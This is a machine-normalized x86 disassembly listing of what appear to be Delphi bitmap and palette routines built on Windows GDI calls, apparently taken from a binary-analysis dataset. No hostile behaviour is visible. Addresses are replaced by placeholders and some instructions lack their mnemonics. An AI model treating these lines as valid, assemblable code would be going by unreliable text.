mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetBrushOrgEx
push 0x4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetStretchBltMode
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0xd ]
push eax
mov eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetBrushOrgEx
jmp r-xdata
xor eax eax
push ebp
push sub_426cb1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
push 0x3
mov eax [ ebp - 0x4 ]
call sub_4224e8
push eax
call SetStretchBltMode
mov eax ebx
call sub_426d44
mov dl [ r-xdata ]
call sub_4225bc
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
mov eax ebx
call sub_426fa4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ esi + 0x1c ]
push eax
push 0x0
push 0x0
mov eax ebx
call sub_426d44
mov eax [ eax + 0x4 ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call StretchBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426cb8
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_426c46
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call CreateCompatibleDC
call sub_4228e0
mov [ ebp - 0x18 ] eax
mov eax [ esi + 0xc ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax ebx
call sub_426d44
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ esi + 0x1c ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0x0
push 0x0
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_422a84
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
retn
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
sub_426cc4
push ebx
push esi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x4 ] 0x1
jle r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax esi
call sub_426f04
cmp [ ebx + 0x71 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
xor eax eax
jmp r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
lea edx [ ebx + 0x18 ]
push edx
mov ecx eax
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_426910
pop esi
pop ebx
retn
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x2c ] eax
push esi
call DeleteObject
test eax eax
jne r-xdata
call sub_422838
sub_426d44
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov eax [ ebx + 0x2c ]
pop esi
pop ebx
retn
mov eax ebx
call sub_426f04
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_425ae0
mov esi eax
mov [ ebx + 0x2c ] esi
mov [ esi + 0x2c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x10 ]
mov [ esi + 0x28 ] eax
mov [ esi + 0x34 ] ebx
mov [ esi + 0x30 ] sub_4269d0
sub_426d8c
push ebx
mov ebx eax
mov eax ebx
call sub_426ef4
mov eax ebx
call sub_426f04
mov edx ebx
mov eax ebx
call sub_4269d0
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
pop ebx
retn
sub_426db0
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x8 ]
test edx edx
je r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp edx [ eax + 0x14 ]
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov al 0x1
jmp r-xdata
retn
sub_426e30
push ebx
mov ebx eax
mov eax [ ebx + 0x34 ]
cmp eax 0x20000000
jne r-xdata
call sub_421054
mov eax ebx
call sub_426e00
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
dec eax
push eax
mov eax ebx
call sub_426d44
xor edx edx
pop ecx
call sub_422474
jmp r-xdata
mov eax 0xffffff
jmp r-xdata
or eax 0x2000000
pop ebx
retn
sub_426e80
push ebx
push esi
mov ebx [ eax + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
call sub_427004
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
lea eax [ ebx + 0x18 ]
push eax
push 0x0
mov esi [ ebx + 0x10 ]
mov ecx esi
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_425ea8
mov [ ebx + 0x14 ] eax
lea eax [ ebx + 0x18 ]
push eax
push 0x54
mov eax [ ebx + 0x8 ]
push eax
call GetObjectA
lea eax [ ebx + 0x18 ]
mov edx eax
add eax 0x18
mov [ eax ] 0x28
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] 0x1
mov cx [ edx + 0x10 ]
imul cx [ edx + 0x12 ]
mov [ eax + 0xe ] cx
sub_426f04
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn
mov edx [ eax + 0x14 ]
mov [ eax + 0x8 ] edx
cmp [ eax + 0x6c ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ eax + 0x6c ]
call sub_418900
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x10 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x14 ]
mov [ ebp - 0xc ] edx
xor eax eax
push ebp
push sub_426f87
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x10 ] edx
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
retn
sub_426fa4
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x32 ] 0x0
je r-xdata
mov esi [ ebx + 0x28 ]
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
cmp [ ebx + 0x31 ] 0x0
jne r-xdata
mov eax ebx
call sub_426ef4
mov eax ebx
call sub_426f04
mov eax ebx
call sub_426e30
mov ecx eax
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
call sub_426570
mov [ esi + 0xc ] eax
mov [ ebx + 0x32 ] 0x1
mov [ ebx + 0x31 ] 0x1
call sub_425a64
mov eax [ esi + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_427004
push ebx
push esi
push edi
push ebp
mov edi eax
mov ebp [ edi + 0x28 ]
cmp [ edi + 0x30 ] 0x0
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax [ ebp + 0x14 ]
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov cx [ ebp + 0x3e ]
mov eax 0x1
shl eax cl
mov ecx eax
xor edx edx
mov eax [ ebp + 0x14 ]
call sub_422fd0
mov esi eax
mov [ ebp + 0x10 ] esi
test esi esi
jne r-xdata
call sub_425a64
push 0x0
call GetDC
call sub_4228e0
mov esi eax
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
mov bl 0x1
push 0xc
push esi
call GetDeviceCaps
mov ebx eax
push 0xe
push esi
call GetDeviceCaps
imul ebx eax
movzx eax [ ebp + 0x2a ]
movzx edx [ ebp + 0x28 ]
imul edx
cmp ebx eax
jl r-xdata
push esi
push 0x0
call ReleaseDC
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push esi
call CreateHalftonePalette
mov [ ebp + 0x10 ] eax
xor ebx ebx
jmp r-xdata
mov [ edi + 0x30 ] 0x1
mov [ ebp + 0x71 ] bl
test bl bl
je r-xdata
sub_4270bc
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
mov ebx ecx
mov esi eax
cmp dx 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_4227a8
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x54 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx ebx
mov eax esi
call sub_426910
mov eax [ esi + 0x28 ]
mov [ eax + 0x70 ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ esi + 0x22 ] al
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_426ef4
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x54
call sub_402fc4
lea eax [ ebp - 0x54 ]
push eax
push 0x54
push ebx
call GetObjectA
cmp [ ebp - 0x40 ] 0x0
jne r-xdata
sub_427140
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_418914
push eax
mov eax ebx
call sub_4188e0
pop ecx
sub ecx eax
mov edx ebx
mov eax esi
call sub_427854
pop esi
pop ebx
retn
sub_427164
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push ecx
push 0x2
mov eax [ r-xdata ]
mov cl 0x1
xchg edx ecx
call sub_419114
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4271b9
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov eax [ ebp - 0x4 ]
call sub_418914
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4272ec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4271c0
mov eax [ ebp - 0x4 ]
call sub_4036c0
retn
sub_4271c4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42724b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax + 0x10 ] esi
mov eax [ ebp + 0x10 ]
mov edx [ ebp - 0x8 ]
mov esi eax
lea edi [ edx + 0x18 ]
mov ecx 0x15
[ edi ] [ esi ]
mov eax [ ebp - 0x8 ]
mov dl [ ebp + 0xc ]
mov [ eax + 0x70 ] dl
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x2c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ r-xdata ]
call sub_403870
mov edx [ ebp - 0x8 ]
mov [ edx + 0x6c ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x14 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_4272ab
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_425cd8
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov [ edx + 0x28 ] eax
call sub_425cd4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4272b2
push rw-data
call LeaveCriticalSection
retn
sub_4272c4
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x4
mov eax esi
mov edi [ eax ]
call [ edi + 0x8 ]
mov ecx [ esp ]
mov edx esi
mov eax ebx
call sub_427854
pop edx
pop edi
pop esi
pop ebx
retn
sub_4272ec
push ebp
mov ebp esp
add esp 0xffffff54
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
cmp [ ebp - 0x20 ] 0xc
sete [ ebp - 0x21 ]
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax 0xc
add eax 0x400
call sub_402744
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x3c ] eax
xor edx edx
push ebp
push sub_427809
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
push ebp
push sub_4277dc
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov [ ebp - 0x20 ] 0x28
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
sub esi [ ebp - 0x20 ]
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
cmp eax 0x3
je r-xdata
lea edx [ ebp - 0x48 ]
add edx 0x4
mov ecx 0x8
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
mov ebx [ ebp - 0x3c ]
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_402fc4
mov eax ebx
movzx edx [ ebp - 0x44 ]
mov [ eax + 0x4 ] edx
movzx edx [ ebp - 0x42 ]
mov [ eax + 0x8 ] edx
mov dx [ ebp - 0x40 ]
mov [ eax + 0xc ] dx
mov dx [ ebp - 0x3e ]
mov [ eax + 0xe ] dx
sub esi 0xc
jmp r-xdata
mov ebx [ ebp - 0x3c ]
mov eax [ ebp - 0x20 ]
mov [ ebx ] eax
mov eax [ ebp - 0x18 ]
add eax [ ebp - 0x20 ]
mov [ ebp - 0x1c ] eax
cmp [ ebx + 0xc ] 0x1
je r-xdata
test eax eax
je r-xdata
cmp [ ebp - 0x20 ] 0x28
jne r-xdata
call sub_4227c0
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ ebp - 0x38 ] eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
mov ax [ ebx + 0xe ]
cmp ax 0x10
je r-xdata
mov edx [ ebp + 0x8 ]
mov ecx 0xe
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax esi
xor edx edx
push edx
push eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_418b7c
mov edx esi
neg edx
mov cx 0x2
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xaa ]
xor ecx ecx
mov edx 0xe
call sub_402fc4
mov [ ebp - 0xaa ] 0x4d42
mov eax [ ebp - 0x20 ]
add eax esi
mov [ ebp - 0xa8 ] eax
lea eax [ ebp - 0xaa ]
mov [ ebp + 0x8 ] eax
mov ecx [ ebx + 0x20 ]
movzx edi [ ebp - 0x21 ]
xor eax eax
mov al [ edi + rw-data ]
imul ecx eax
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_418b0c
mov eax [ ebx + 0x20 ]
xor edx edx
mov dl [ edi + rw-data ]
imul edx
sub esi eax
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov ax [ ebx + 0xe ]
call sub_422a50
mov [ ebx + 0x20 ] eax
cmp [ ebx + 0x10 ] 0x3
jne r-xdata
cmp ax 0x20
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp esi eax
jbe r-xdata
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_422a70
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
mov edx [ ebp - 0x1c ]
mov ecx 0xc
mov eax [ ebp - 0x8 ]
call sub_418b0c
add [ ebp - 0x1c ] 0xc
sub esi 0xc
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov esi eax
push 0x0
call GetDC
call sub_4228e0
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_427757
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
call sub_422d18
cmp [ rw-data ] 0x0
je r-xdata
cmp eax 0x3
jne r-xdata
push 0x0
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateDIBSection
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax esi
call sub_402744
mov [ ebp - 0x14 ] eax
xor edx edx
push ebp
push sub_4276bf
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_418b0c
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleDC
call sub_4228e0
mov [ ebp - 0x10 ] eax
push 0x1
push 0x1
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleBitmap
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
test eax eax
jbe r-xdata
call GetLastError
test eax eax
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_427693
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x14 ]
push edx
push 0x4
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_422fd0
mov [ ebp - 0x30 ] eax
push 0x0
mov eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
call sub_40d2f0
call sub_4227c0
jmp r-xdata
xor eax eax
push ebp
push sub_427726
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_418b0c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42769a
cmp [ ebp - 0x34 ] 0x0
je r-xdata
call GetLastError
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42775e
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
retn
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
push eax
call DeleteObject
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
call sub_40d2f0
call sub_4227c0
jmp r-xdata
sub_42769a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_402764
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
sub_42775e
mov eax [ ebp - 0x3c ]
cmp [ eax + 0xe ] 0x8
jbe r-xdata
lea eax [ ebp - 0x9c ]
xor ecx ecx
mov edx 0x54
call sub_402fc4
lea eax [ ebp - 0x9c ]
push eax
push 0x54
mov eax [ ebp - 0x28 ]
push eax
call GetObjectA
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x6c ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x68 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x24 ]
mov [ ebp - 0x60 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_4277f3
mov eax [ ebp - 0x3c ]
cmp [ eax + 0x20 ] 0x0
jbe r-xdata
cmp [ ebp - 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x3c ]
mov ecx [ eax + 0x20 ]
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_422fd0
mov [ ebp - 0x30 ] eax
sub_427810
lea eax [ ebp - 0x9c ]
push eax
mov al [ ebp - 0x21 ]
push eax
mov eax [ ebp - 0x38 ]
push eax
mov ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_4271c4
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov edx [ ebp - 0x4 ]
mov [ edx + 0x22 ] al
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_427854
push ebx
push esi
push edi
add esp 0xffffff9c
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_426ef4
test esi esi
jne r-xdata
mov edx esp
mov ecx 0xe
mov eax edi
call sub_418b0c
cmp [ esp ] 0x4d42
je r-xdata
lea eax [ esp + 0xe ]
xor ecx ecx
mov edx 0x54
call sub_402fc4
lea eax [ esp + 0xe ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
call sub_4271c4
jmp r-xdata
push esp
mov ecx esi
sub ecx 0xe
mov edx edi
mov eax ebx
call sub_4272ec
call sub_4227c0
add esp 0x64
pop edi
pop esi
pop ebx
retn
sub_4278c4
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x8 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
call sub_426ef4
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_402fc4
test edi edi
je r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
lea eax [ ebp - 0x58 ]
push eax
push 0x54
push edi
call GetObjectA
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ esi + 0x10 ]
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
call sub_42650c
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_42795f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_4271c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_427988
push ebx
push esi
push edi
push ebp
add esp 0xffffffac
mov ebx edx
mov esi eax
mov eax esi
call sub_426db0
cmp bl al
je r-xdata
add esp 0x54
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x28 ]
cmp [ edi + 0x8 ] 0x0
jne r-xdata
test bl bl
jne r-xdata
cmp [ edi + 0x14 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
mov eax [ edi + 0x14 ]
test eax eax
je r-xdata
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_426ef4
mov eax esi
call sub_427004
push esi
push edi
lea esi [ edi + 0x18 ]
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
cmp [ edi + 0x4 ] 0x1
sete bl
test bl bl
je r-xdata
cmp eax [ edi + 0x14 ]
jne r-xdata
mov eax esi
call sub_426ef4
mov eax esi
call sub_427004
mov eax esi
call sub_426e80
cmp [ edi + 0x4 ] 0x1
jne r-xdata
cmp eax [ edi + 0x8 ]
je r-xdata
mov [ edi + 0x30 ] 0x28
jmp r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
jmp r-xdata
mov eax [ edi + 0x10 ]
call sub_42650c
mov ebp eax
mov ebp [ edi + 0x10 ]
jmp r-xdata
lea eax [ edi + 0x18 ]
push eax
mov ecx [ edi + 0x10 ]
mov edx [ edi + 0x14 ]
mov eax esi
call sub_426910
jmp r-xdata
mov eax [ edi + 0x14 ]
xor edx edx
mov [ edi + 0x14 ] edx
mov ebp [ edi + 0x10 ]
xor edx edx
mov [ edi + 0x10 ] edx
lea edx [ edi + 0x18 ]
push edx
mov dl [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_4271c4
jmp r-xdata
push esp
mov dl [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_4271c4
mov [ edi + 0x8 ] eax
jmp r-xdata
push esp
push 0x0
mov ecx ebp
mov edx [ edi + 0x10 ]
mov eax [ edi + 0x14 ]
call sub_425ea8
test bl bl
je r-xdata
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_427ac0
push ebx
push esi
push edi
add esp 0xffffffac
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x20 ]
je r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_426f04
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x8 ] edi
mov [ esp + 0x20 ] edi
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_426910
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_427b14
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx edx
mov edi eax
mov esi [ edi + 0x28 ]
lea eax [ esi + 0x30 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0xe ] 0x1
je r-xdata
cmp bl al
je r-xdata
mov al 0x1
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_426f04
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
xor eax eax
mov al bl
mov [ esp + 0x24 ] ax
mov [ esp + 0x26 ] ax
mov [ esp + 0x10 ] ax
mov [ esp + 0x12 ] ax
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
